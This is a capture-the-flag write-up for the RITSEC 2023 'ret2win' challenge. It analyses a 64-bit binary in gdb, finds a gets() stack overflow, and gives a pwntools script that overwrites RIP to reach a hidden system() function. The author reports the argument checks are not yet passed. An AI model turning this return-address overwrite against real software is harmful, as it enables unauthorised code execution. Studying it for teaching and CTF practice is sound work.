# ret2win

## Overview

- 83 Points / 208 Solves

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★☆☆

## Background

Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.

`nc ret2win.challenges.ctf.ritsec.club 1337`

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401202159.png)

## Enumeration

**In this challenge, we can download a file:**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.01|20:21:07(HKT)]
└> file ret2win                
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6407290ddc178ebcff6a243a585c21e8c32a440b, for GNU/Linux 3.2.0, not stripped
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.01|20:21:08(HKT)]
└> chmod +x ret2win
```

It's an 64-bit ELF executable, and it's not stripped.

**Let's view memory protections via pwntool's `checksec`:**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.01|20:24:19(HKT)]
└> checksec ret2win 
[*] '/home/siunam/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

As you can see, it has **no memory protections**, like Stack, NX, PIE!

We can try to run that executable and see what will happened:

```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.01|20:25:35(HKT)]
└> ./ret2win
Are you expert at exploit development, join the world leading cybersecurity company, Republic of Potatoes(ROP)
[*] This is a simple pwn challenge...get to the secret function!!
test
[*] Good start test, now do some damage :)
```

We can input something and it outputs our input.

**Now, let's use `gdb` to reverse engineer it!**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.01|20:25:37(HKT)]
└> gdb ./ret2win   
[...]
gef➤  
```

> Note: I'm using `gdb`'s plugin `gef`.

**Disassembling function `main()`:**
```shell
gef➤  disassemble main 
Dump of assembler code for function main:
   0x000000000040121c <+0>:	endbr64
   0x0000000000401220 <+4>:	push   rbp
   0x0000000000401221 <+5>:	mov    rbp,rsp
   0x0000000000401224 <+8>:	lea    rdi,[rip+0xe85]        # 0x4020b0
   0x000000000040122b <+15>:	call   0x401070 <puts@plt>
   0x0000000000401230 <+20>:	lea    rdi,[rip+0xee9]        # 0x402120
   0x0000000000401237 <+27>:	call   0x401070 <puts@plt>
   0x000000000040123c <+32>:	mov    eax,0x0
   0x0000000000401241 <+37>:	call   0x4011e4 <user_input>
   0x0000000000401246 <+42>:	mov    eax,0x0
   0x000000000040124b <+47>:	pop    rbp
   0x000000000040124c <+48>:	ret
End of assembler dump.
```

When `main()` function is ran, it'll call function `user_input()`.

**Function `user_input()`:**
```shell
gef➤  disassemble user_input 
Dump of assembler code for function user_input:
   0x00000000004011e4 <+0>:	endbr64
   0x00000000004011e8 <+4>:	push   rbp
   0x00000000004011e9 <+5>:	mov    rbp,rsp
   0x00000000004011ec <+8>:	sub    rsp,0x20
   0x00000000004011f0 <+12>:	lea    rax,[rbp-0x20]
   0x00000000004011f4 <+16>:	mov    rdi,rax
   0x00000000004011f7 <+19>:	mov    eax,0x0
   0x00000000004011fc <+24>:	call   0x4010a0 <gets@plt>
   0x0000000000401201 <+29>:	lea    rax,[rbp-0x20]
   0x0000000000401205 <+33>:	mov    rsi,rax
   0x0000000000401208 <+36>:	lea    rdi,[rip+0xe71]        # 0x402080
   0x000000000040120f <+43>:	mov    eax,0x0
   0x0000000000401214 <+48>:	call   0x401090 <printf@plt>
   0x0000000000401219 <+53>:	nop
   0x000000000040121a <+54>:	leave
   0x000000000040121b <+55>:	ret
End of assembler dump.
```

In `+24`, **it'll call a function called `gets()`.**

> The C library function **`char *gets(char *str)`** reads a line from stdin and stores it into the string pointed to by str. It stops when either the newline character is read or when the end-of-file is reached, whichever comes first.

However, **this function is very, very dangerous, and must not be used**.

According to the [man](https://linux.die.net/man/3/gets) page, it said:

> Never use **gets**(). Because it is impossible to tell without knowing the data in advance how many characters **gets**() will read, and because **gets**() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use **fgets**() instead.

With that said, we can do the basic **stack buffer overflow**!

**In `+29` and `+33`, we see:**
```asm
lea    rax,[rbp-0x20]
mov    rsi,rax
```

The `gets()` function takes 32 bytes (`0x20`) to the stack.

**If the input goes over 32 bytes, it'll overflow!**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.01|20:28:53(HKT)]
└> python3 -c "print('A' * 32 + 'B' * 8)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.01|20:29:04(HKT)]
└> ./ret2win 
Are you expert at exploit development, join the world leading cybersecurity company, Republic of Potatoes(ROP)
[*] This is a simple pwn challenge...get to the secret function!!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
[*] Good start AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB, now do some damage :) 
[1]    258704 segmentation fault  ./ret2win
```

We have a **segmentation fault**, which can confirm it's vulnerable to stack buffer overflow.

Next, we need to find a function that can gain benefits to us!

**When you double Tab the `disassemble` command in `gdb`, it'll show all functions:**
```shell
gef➤  disassemble 
-function                    __libc_csu_init              printf
-label                       _dl_relocate_static_pie      printf@plt
-line                        _fini                        puts
-probe                       _init                        puts@plt
-probe-dtrace                _start                       register_tm_clones
-probe-stap                  deregister_tm_clones         supersecrettoplevelfunction
-qualified                   frame_dummy                  system
-source                      gets                         system@plt
__do_global_dtors_aux        gets@plt                     user_input
__libc_csu_fini              main                         
```

The `supersecrettoplevelfunction` looks sussy!

```shell
gef➤  disassemble supersecrettoplevelfunction 
Dump of assembler code for function supersecrettoplevelfunction:
   0x0000000000401196 <+0>:	endbr64
   0x000000000040119a <+4>:	push   rbp
   0x000000000040119b <+5>:	mov    rbp,rsp
   0x000000000040119e <+8>:	sub    rsp,0x10
   0x00000000004011a2 <+12>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004011a5 <+15>:	mov    DWORD PTR [rbp-0x8],esi
   0x00000000004011a8 <+18>:	lea    rdi,[rip+0xe59]        # 0x402008
   0x00000000004011af <+25>:	call   0x401070 <puts@plt>
   0x00000000004011b4 <+30>:	cmp    DWORD PTR [rbp-0x4],0xcafebabe
   0x00000000004011bb <+37>:	jne    0x4011d4 <supersecrettoplevelfunction+62>
   0x00000000004011bd <+39>:	cmp    DWORD PTR [rbp-0x8],0xc0debabe
   0x00000000004011c4 <+46>:	jne    0x4011d4 <supersecrettoplevelfunction+62>
   0x00000000004011c6 <+48>:	lea    rdi,[rip+0xe6d]        # 0x40203a
   0x00000000004011cd <+55>:	call   0x401080 <system@plt>
   0x00000000004011d2 <+60>:	jmp    0x4011e1 <supersecrettoplevelfunction+75>
   0x00000000004011d4 <+62>:	lea    rdi,[rip+0xe6d]        # 0x402048
   0x00000000004011db <+69>:	call   0x401070 <puts@plt>
   0x00000000004011e0 <+74>:	nop
   0x00000000004011e1 <+75>:	nop
   0x00000000004011e2 <+76>:	leave
   0x00000000004011e3 <+77>:	ret
End of assembler dump.
```

In here, the `cmp` instruction in `+30` will compare **the `rbp` register in `-0x4` is `0xcafebabe` or not**. Then, **it also compares `-0x8` is `0xc0debabe` or not.**

If all conditions are passed, it'll invoke function `system()`, which do some OS command stuff.

## Exploitation

Armed with above information, we can start to exploit stack buffer overflow vulnerability!

- **Goal: Control the RIP register so that we can invoke function `supersecrettoplevelfunction()`**

**Now, we can use `gdb` to confirm we can overflow the RBP register:**
```shell
gef➤  r
[...]
Are you expert at exploit development, join the world leading cybersecurity company, Republic of Potatoes(ROP)
[*] This is a simple pwn challenge...get to the secret function!!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
[*] Good start AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB, now do some damage :) 

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401200 in user_input ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x50              
$rbx   : 0x007fffffffdd68  →  0x007fffffffe0ef  →  "/home/siunam/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win/r[...]"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffdc50  →  0x0000000000000001
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x000000004052a0  →  "[*] Good start AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB[...]"
$rdi   : 0x007fffffffd6c0  →  0x007ffff7e14e70  →  <funlockfile+0> mov rdi, QWORD PTR [rdi+0x88]
$rip   : 0x00000000401200  →  <user_input+28> dec DWORD PTR [rax-0x73]
$r8    : 0x000000004056d9  →  0x0000000000000000
$r9    : 0x73              
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdd78  →  0x007fffffffe128  →  "TERMINATOR_DBUS_NAME=net.tenshu.Terminator21a9d5db[...]"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
[...]
```

As you can see, our RBP register is filled with 8 B's (`42` in hex).

> The reason the RIP was not overflowed (technically it was, as we saw in the above screenshot, but there's more to it), is because the `AAAAAAAA` (`0x4141414141414141`) is considered a non-canonical memory address, or, in other words, `0x4141414141414141` is a 64-bit wide address and current CPUs prevent applications and OSes to use 64-bit wide addresses.
>   
> Instead, the highest memory addresses programs can use are 48-bit wide addresses and they are capped to `0x00007FFFFFFFFFFF`. This is done to prevent the unnecessary complexity in memory address translations that would not provide much benefit to the OSes or applications as it's very unlikely they would ever need to use all of that 64-bit address space.
>  
> Knowing about canonical addresses, we could take control of the RIP if the 64-bit wide return address `0x4141414141414141` (our garbage data) we tried to plant into the vulnerable program's stack, was translated to a 48-bit canonical address by masking off the 2 highest bytes. (From [Red Team Notes](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow))

**To overflow RIP register in 64-bit executable, we can use the following testing payload:**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.01|20:46:22(HKT)]
└> python3 -c "print('A' * 32 + 'B' * 8 + 'C' * 6)"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC

gef➤  r
[...]
Are you expert at exploit development, join the world leading cybersecurity company, Republic of Potatoes(ROP)
[*] This is a simple pwn challenge...get to the secret function!!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC
[*] Good start AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC, now do some damage :) 

Program received signal SIGSEGV, Segmentation fault.
0x0000434343434343 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x56              
$rbx   : 0x007fffffffdd68  →  0x007fffffffe0ef  →  "/home/siunam/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win/r[...]"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffdc50  →  0x0000000000000001
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x000000004052a0  →  "[*] Good start AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB[...]"
$rdi   : 0x007fffffffd6c0  →  0x007ffff7e14e70  →  <funlockfile+0> mov rdi, QWORD PTR [rdi+0x88]
$rip   : 0x434343434343    
$r8    : 0x000000004056df  →  0x0000000000000000
$r9    : 0x73              
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdd78  →  0x007fffffffe128  →  "TERMINATOR_DBUS_NAME=net.tenshu.Terminator21a9d5db[...]"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
[...]
```

This time, we successfully overflowed the RIP register with ***6 C's*** (`43` in hex).

Now we controlled the RIP register, let's ***change it's value to function `supersecrettoplevelfunction()`'s memory address!***

**To find it's address, we can use `p` command in `gdb`:**
```shell
gef➤  p supersecrettoplevelfunction
$1 = {<text variable, no debug info>} 0x401196 <supersecrettoplevelfunction>
```

- Function `supersecrettoplevelfunction()` memory address: `0x401196`

**Finally, we can write a Python script to exploit it locally:**
```py
#!/usr/bin/env python3
from pwn import *

def main():
    elf = ELF('./ret2win')
    # Local
    r = process(elf.path)
    # Remote
    # r = remote('ret2win.challenges.ctf.ritsec.club', 1337)

    padding = b'A' * 32

    # 0xcafebabe, 0xc0debabe RBP register in CMP instruction in function `supersecrettoplevelfunction()`
    # cmp1 = p64(0xcafebabe)
    # cmp2 = p64(0xc0debabe)
    cmp1 = b'\xbe\xba\xfe\xca'
    cmp2 = b'\xbe\xba\xde\xc0'

    supersecrettoplevelfunction = p64(elf.symbols.supersecrettoplevelfunction)

    # Stack: padding -> RBP: cmp1 + cmp2 -> RIP: supersecrettoplevelfunction()
    payload = padding + cmp1 + cmp2 + supersecrettoplevelfunction
    log.info(f'Payload: {payload}')

    # For GDB debug
    with open('payload', 'wb') as file:
        file.write(payload)

    # r.sendline(payload)
    r.sendlineafter(b'!!\n', payload)
    print(r.recvall())
    r.interactive()

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win)-[2023.04.02|23:50:12(HKT)]
└> python3 solve.py
[*] '/home/siunam/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process '/home/siunam/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win/ret2win': pid 396927
[*] Payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca\xbe\xba\xde\xc0\x96\x11@\x00\x00\x00\x00\x00'
[+] Receiving all data: Done (186B)
[*] Stopped process '/home/siunam/ctf/RITSEC-CTF-2023/BIN-PWN/ret2win/ret2win' (pid 396927)
b'[*] Good start AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca\xbe\xba\xde\xc0\x96\x11@, now do some damage :) \n[*]  if you figure out my address, you are hired.\n[!!] You are good but not good enough for my company\n'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```

However, I tried to pass CMP instructions check in the RBP register, still no dice...